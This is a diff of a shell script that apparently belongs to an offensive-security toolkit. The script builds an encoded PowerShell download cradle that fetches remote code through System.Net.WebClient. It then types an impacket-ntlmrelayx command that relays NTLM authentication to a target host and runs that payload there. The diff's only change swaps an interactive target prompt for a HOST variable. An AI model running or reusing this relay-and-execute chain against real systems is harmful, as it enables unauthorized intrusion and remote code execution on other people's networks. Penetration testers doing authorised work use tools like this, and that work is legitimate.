@@ -5,9 +5,7 @@ full_command="\$text = \"(New-Object System.Net.WebClient).DownloadString('http:
 
 ret_val=$(pwsh -c $full_command)
 
-target=$(zenity --entry --title="Relay target" --text="Target:")
-
-com="impacket-ntlmrelayx --no-http-server -smb2support -t ${target} -c 'powershell -enc ${ret_val}'"
+com="impacket-ntlmrelayx --no-http-server -smb2support -t ${HOST} -c 'powershell -enc ${ret_val}'"
 
 type_command "${com}"
 type_newline
